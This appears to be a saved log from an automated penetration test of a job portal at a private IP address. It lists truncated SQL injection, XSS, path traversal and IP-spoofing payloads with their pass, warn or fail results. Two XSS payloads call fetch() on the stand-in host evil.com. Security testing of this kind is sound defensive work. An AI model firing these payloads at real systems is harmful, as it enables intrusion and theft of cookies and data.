@@ -1,0 +1,294 @@
+[0;31m[1m
+  ╔══════════════════════════════════════════════════════════════╗
+  ║     🔓 SECURE JOB PORTAL — PENETRATION TEST SUITE 🔓       ║
+  ║     Simulating: SQL Injection, XSS, CSRF, Buffer           ║
+  ║     Overflow, Session Hijacking & More                      ║
+  ╚══════════════════════════════════════════════════════════════╝
+[0m
+  Target: [1mhttps://192.168.2.233[0m
+  Time:   2026-04-13 11:10:00
+
+
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+[0;36m[1m  1. SQL INJECTION ATTACKS[0m
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+
+  [1m1.1 Authentication Bypass Attempts[0m
+  [0;32m[PASS][0m Login SQLi: ' OR '1'='1...
+         [0;32m↳ Rejected (HTTP 401)[0m
+  [0;32m[PASS][0m Login SQLi: ' OR '1'='1' --...
+         [0;32m↳ Rejected (HTTP 401)[0m
+  [0;32m[PASS][0m Login SQLi: ' OR '1'='1' /*...
+         [0;32m↳ Rejected (HTTP 429)[0m
+  [0;32m[PASS][0m Login SQLi: admin'--...
+         [0;32m↳ Rejected (HTTP 429)[0m
+  [0;32m[PASS][0m Login SQLi: ' UNION SELECT null,null,null --...
+         [0;32m↳ Rejected (HTTP 429)[0m
+  [0;32m[PASS][0m Login SQLi: 1; DROP TABLE users; --...
+         [0;32m↳ Rejected (HTTP 429)[0m
+  [0;32m[PASS][0m Login SQLi: ' OR 1=1; --...
+         [0;32m↳ Rejected (HTTP 429)[0m
+  [0;32m[PASS][0m Login SQLi: ') OR ('1'='1...
+         [0;32m↳ Rejected (HTTP 429)[0m
+  [0;32m[PASS][0m Login SQLi: ' OR ''='...
+         [0;32m↳ Rejected (HTTP 429)[0m
+  [0;32m[PASS][0m Login SQLi: 1' AND 1=CONVERT(int,(SELECT TOP 1 table...
+         [0;32m↳ Rejected (HTTP 429)[0m
+
+  [1m1.2 SQL Injection in Search Endpoints[0m
+  [0;32m[PASS][0m Search SQLi: '; DROP TABLE users;--...
+         [0;32m↳ Blocked (HTTP 401)[0m
+  [0;32m[PASS][0m Search SQLi: ' UNION SELECT username,password FROM users--...
+         [0;32m↳ Blocked (HTTP 401)[0m
+  [0;32m[PASS][0m Search SQLi: 1 OR 1=1...
+         [0;32m↳ Blocked (HTTP 401)[0m
+  [0;32m[PASS][0m Search SQLi: ' AND (SELECT COUNT(*) FROM users) > 0 --...
+         [0;32m↳ Blocked (HTTP 401)[0m
+  [0;32m[PASS][0m Search SQLi: admin' AND SUBSTRING(password,1,1)='a'--...
+         [0;32m↳ Blocked (HTTP 401)[0m
+
+  [1m1.3 SQL Injection in Path Parameters[0m
+  [1;33m[WARN][0m Path SQLi: 1%20OR%201=1...
+         [1;33m↳ Returned HTTP 401, manual review needed[0m
+  [1;33m[WARN][0m Path SQLi: 1;%20DROP%20TABLE%20users...
+         [1;33m↳ Returned HTTP 401, manual review needed[0m
+  [1;33m[WARN][0m Path SQLi: 1'%20UNION%20SELECT%20*%20FROM%20users--...
+         [1;33m↳ Returned HTTP 401, manual review needed[0m
+
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+[0;36m[1m  2. CROSS-SITE SCRIPTING (XSS)[0m
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+
+  [1m2.1 Stored XSS via Registration[0m
+  [0;32m[PASS][0m Stored XSS: <script>alert("XSS")</script>...
+         [0;32m↳ Payload sanitized or rejected[0m
+  [0;32m[PASS][0m Stored XSS: <img src=x onerror=alert(1)>...
+         [0;32m↳ Payload sanitized or rejected[0m
+  [0;32m[PASS][0m Stored XSS: "><svg/onload=alert(1)>...
+         [0;32m↳ Payload sanitized or rejected[0m
+  [0;32m[PASS][0m Stored XSS: javascript:alert(document.cookie)...
+         [0;32m↳ Payload sanitized or rejected[0m
+  [0;32m[PASS][0m Stored XSS: <iframe src="javascript:alert(1)">...
+         [0;32m↳ Payload sanitized or rejected[0m
+  [0;32m[PASS][0m Stored XSS: "><img src=x onerror=fetch("https://evil.com/...
+         [0;32m↳ Payload sanitized or rejected[0m
+  [0;32m[PASS][0m Stored XSS: ';alert(String.fromCharCode(88,83,83))//'...
+         [0;32m↳ Payload sanitized or rejected[0m
+  [0;32m[PASS][0m Stored XSS: <body onload=alert(1)>...
+         [0;32m↳ Payload sanitized or rejected[0m
+  [0;32m[PASS][0m Stored XSS: <div style="background:url(javascript:alert(1...
+         [0;32m↳ Payload sanitized or rejected[0m
+  [0;32m[PASS][0m Stored XSS: {{constructor.constructor("return this")().al...
+         [0;32m↳ Payload sanitized or rejected[0m
+
+  [1m2.2 Reflected XSS via Search[0m
+  [0;32m[PASS][0m Reflected XSS: <script>alert("XSS")</script>...
+         [0;32m↳ Not reflected[0m
+  [0;32m[PASS][0m Reflected XSS: <img src=x onerror=alert(1)>...
+         [0;32m↳ Not reflected[0m
+  [0;32m[PASS][0m Reflected XSS: "><svg/onload=alert(1)>...
+         [0;32m↳ Not reflected[0m
+  [0;32m[PASS][0m Reflected XSS: javascript:alert(document.cookie)...
+         [0;32m↳ Not reflected[0m
+  [0;32m[PASS][0m Reflected XSS: <iframe src="javascript:alert(1)">...
+         [0;32m↳ Not reflected[0m
+  [0;32m[PASS][0m Reflected XSS: "><img src=x onerror=fetch("https://evil...
+         [0;32m↳ Not reflected[0m
+  [0;32m[PASS][0m Reflected XSS: ';alert(String.fromCharCode(88,83,83))//...
+         [0;32m↳ Not reflected[0m
+  [0;32m[PASS][0m Reflected XSS: <body onload=alert(1)>...
+         [0;32m↳ Not reflected[0m
+  [0;32m[PASS][0m Reflected XSS: <div style="background:url(javascript:al...
+         [0;32m↳ Not reflected[0m
+  [0;32m[PASS][0m Reflected XSS: {{constructor.constructor("return this")...
+         [0;32m↳ Not reflected[0m
+
+  [1m2.3 XSS Security Headers Check[0m
+  [0;31m[FAIL][0m X-XSS-Protection header present
+         [0;31m↳ Missing — browsers won't filter XSS[0m
+  [0;31m[FAIL][0m Content-Security-Policy header present
+         [0;31m↳ Missing — no CSP protection![0m
+  [0;32m[PASS][0m X-Content-Type-Options header present
+         [0;32m↳ nosniff prevents MIME confusion[0m
+
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+[0;36m[1m  3. CSRF PROTECTION[0m
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+
+  [1m3.1 State-Changing Requests Without CSRF Token[0m
+  [0;32m[PASS][0m PUT /users/me without CSRF token
+         [0;32m↳ Blocked with 403 Forbidden[0m
+  [0;32m[PASS][0m DELETE without CSRF token
+         [0;32m↳ Blocked with 403[0m
+
+  [1m3.2 Forged / Invalid CSRF Token[0m
+  [0;32m[PASS][0m PUT with forged CSRF token
+         [0;32m↳ Blocked — token mismatch detected[0m
+
+  [1m3.3 CSRF Cookie Flags[0m
+  [0;32m[PASS][0m CSRF cookie has SameSite attribute
+         [0;32m↳ Cross-site requests won't send cookie[0m
+
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+[0;36m[1m  4. BUFFER OVERFLOW & OVERSIZED PAYLOADS[0m
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+
+  [1m4.1 Oversized Input Fields[0m
+  [0;32m[PASS][0m 10KB email in login
+         [0;32m↳ Handled gracefully (HTTP 429)[0m
+  [0;32m[PASS][0m 100KB password in login
+         [0;32m↳ Handled gracefully (HTTP 429)[0m
+
+  [1m4.2 Oversized Registration Payload[0m
+  [1;33m[WARN][0m 1MB name in registration
+         [1;33m↳ Accepted (HTTP ) — check if truncated[0m
+
+  [1m4.3 Massive Request Body (5MB JSON)[0m
+  [0;32m[PASS][0m 5MB JSON body
+         [0;32m↳ Rejected (HTTP 413)[0m
+
+  [1m4.4 Deeply Nested JSON (Billion Laughs style)[0m
+  [1;33m[WARN][0m Deeply nested JSON (500 levels)
+         [1;33m↳ HTTP 429 — verify no crash[0m
+
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+[0;36m[1m  5. SESSION HIJACKING[0m
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+
+  [1m5.1 Cookie Security Flags[0m
+  [1;33m[WARN][0m access_token has HttpOnly flag
+         [1;33m↳ No access_token cookie found in response[0m
+  [1;33m[WARN][0m access_token has Secure flag
+         [1;33m↳ Secure flag not confirmed — verify in production[0m
+  [1;33m[WARN][0m access_token has SameSite flag
+         [1;33m↳ SameSite not confirmed (defaults to Lax in modern browsers)[0m
+
+  [1m5.2 Forged/Stolen JWT Token[0m
+  [0;32m[PASS][0m Forged JWT rejected
+         [0;32m↳ 401 — fake token correctly rejected[0m
+
+  [1m5.3 Token Replay with Modified Fingerprint[0m
+  [0;32m[PASS][0m Spoofed fingerprint rejected
+         [0;32m↳ Device fingerprinting working[0m
+
+  [1m5.4 Session Fixation[0m
+  [0;32m[PASS][0m Session fixation attempt
+         [0;32m↳ Fixed session rejected[0m
+
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+[0;36m[1m  6. AUTHENTICATION ATTACKS[0m
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+
+  [1m6.1 Brute Force Login & Account Lockout[0m
+  [0;32m[PASS][0m Account lockout after 1 attempts
+         [0;32m↳ Brute force protection active[0m
+
+  [1m6.2 User Enumeration Prevention[0m
+  [0;32m[PASS][0m User enumeration prevention
+         [0;32m↳ Same error for existing and non-existing users[0m
+
+  [1m6.3 Rate Limiting on Login[0m
+  [0;32m[PASS][0m Rate limiting triggered after 1 requests
+         [0;32m↳ 429 Too Many Requests[0m
+
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+[0;36m[1m  7. AUTHORIZATION ATTACKS[0m
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+
+  [1m7.1 Access Admin Panel Without Admin Role[0m
+  [0;32m[PASS][0m Admin panel (unauthenticated)
+         [0;32m↳ Blocked (HTTP 401)[0m
+
+  [1m7.2 IDOR — Access Other Users' Data[0m
+  [0;32m[PASS][0m IDOR on /users/{id}
+         [0;32m↳ Protected (HTTP 401)[0m
+
+  [1m7.3 Direct Admin API Manipulation[0m
+  [0;32m[PASS][0m Role escalation attempt
+         [0;32m↳ Blocked (HTTP 403)[0m
+
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+[0;36m[1m  8. SECURITY HEADERS & MISCONFIGURATION[0m
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+
+  [1m8.1 Response Headers Audit[0m
+  [0;32m[PASS][0m X-Frame-Options
+         [0;32m↳ x-frame-options: DENY[0m
+  [0;32m[PASS][0m X-Content-Type-Options
+         [0;32m↳ x-content-type-options: nosniff[0m
+  [0;32m[PASS][0m Strict-Transport-Security
+         [0;32m↳ strict-transport-security: max-age=31536000; includeSubDomains[0m
+  [0;32m[PASS][0m Content-Security-Policy
+         [0;32m↳ content-security-policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'[0m
+  [0;32m[PASS][0m Referrer-Policy
+         [0;32m↳ referrer-policy: strict-origin-when-cross-origin[0m
+  [0;32m[PASS][0m Permissions-Policy
+         [0;32m↳ permissions-policy: camera=(), microphone=(), geolocation=(), payment=()[0m
+  [0;32m[PASS][0m X-XSS-Protection
+         [0;32m↳ x-xss-protection: 1; mode=block[0m
+
+  [1m8.2 Information Disclosure[0m
+  [0;32m[PASS][0m Server version hidden
+         [0;32m↳ Server technology not disclosed[0m
+  [0;32m[PASS][0m Swagger docs disabled in prod
+         [0;32m↳ API docs not accessible (HTTP 404)[0m
+  [0;32m[PASS][0m ReDoc disabled in prod
+         [0;32m↳ ReDoc not accessible (HTTP 404)[0m
+
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+[0;36m[1m  9. PATH TRAVERSAL & FILE INCLUSION[0m
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+
+  [1m9.1 Directory Traversal Attacks[0m
+  [0;32m[PASS][0m Path traversal: ../../../../etc/passwd...
+         [0;32m↳ No file leak[0m
+  [0;32m[PASS][0m Path traversal: ..%2F..%2F..%2Fetc%2Fpasswd...
+         [0;32m↳ No file leak[0m
+  [0;32m[PASS][0m Path traversal: ....//....//....//etc/passwd...
+         [0;32m↳ No file leak[0m
+  [0;32m[PASS][0m Path traversal: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd...
+         [0;32m↳ No file leak[0m
+  [0;32m[PASS][0m Path traversal: ..\..\..tc\passwd...
+         [0;32m↳ No file leak[0m
+
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+[0;36m[1m  10. RATE LIMITING EVASION[0m
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+
+  [1m10.1 X-Forwarded-For IP Spoofing[0m
+  [1;33m[WARN][0m Rate limit with X-Forwarded-For spoofing
+         [1;33m↳ 8 requests with spoofed IPs — may not trust X-Forwarded-For or limit is higher[0m
+
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+[0;36m[1m  11. HTTPS & TLS CONFIGURATION[0m
+[0;36m[1m══════════════════════════════════════════════════════════════[0m
+
+  [1m11.1 HTTPS Redirect[0m
+  [0;32m[PASS][0m HTTP → HTTPS redirect
+         [0;32m↳ HTTP redirects to HTTPS (301)[0m
+
+  [1m11.2 HSTS Header[0m
+  [0;32m[PASS][0m HSTS enabled
+         [0;32m↳ Browsers will enforce HTTPS[0m
+
+[1m[0;36m══════════════════════════════════════════════════════════════[0m
+[1m[0;36m  PENETRATION TEST REPORT[0m
+[1m[0;36m══════════════════════════════════════════════════════════════[0m
+
+  Target:    [1mhttps://192.168.2.233[0m
+  Completed: [1m2026-04-13 11:10:05[0m
+
+  ┌──────────────────────────────────┐
+  │  [0;32mPASSED:  69[0m tests              │
+  │  [1;33mWARNINGS: 9[0m tests              │
+  │  [0;31mFAILED:  2[0m tests              │
+  │  [1mTOTAL:   80[0m tests              │
+  └──────────────────────────────────┘
+
+  [1;33m[1m⚠️  GOOD — but 2 issue(s) need attention.[0m
+
+  [0;36mLegend:[0m
+    [0;32m[PASS][0m = Attack was blocked/mitigated
+    [1;33m[WARN][0m = Needs manual review
+    [0;31m[FAIL][0m = Vulnerability detected
+
